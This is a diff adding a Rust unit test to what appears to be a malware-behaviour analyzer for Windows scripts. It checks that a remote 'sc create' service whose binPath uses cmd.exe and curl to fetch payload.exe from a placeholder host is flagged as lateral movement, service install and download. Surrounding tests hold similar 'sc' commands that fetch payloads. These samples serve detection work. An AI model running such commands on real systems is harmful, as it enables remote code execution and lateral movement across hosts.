@@ -8192,6 +8192,42 @@ sc create UpdateSvc binPath= "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
     }
 
     #[test]
+    fn remote_sc_create_binpath_cmd_child_is_analyzed() {
+        let script = br#"sc \\target.example create UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://remote-sc-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::LateralMovement { tool, target_host }
+                    if tool == "sc" && target_host == "target.example"
+            )),
+            "remote sc lateral movement missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc"
+                        && bin_path.contains("cmd.exe /V:ON /c set U=")
+            )),
+            "remote service install trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://remote-sc-binpath.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "remote service binPath child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn sc_failure_command_child_is_analyzed() {
         let script = br#"echo url = "https://sc-failure.example/payload.exe" > curl.cfg
 sc failure UpdateSvc command= "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
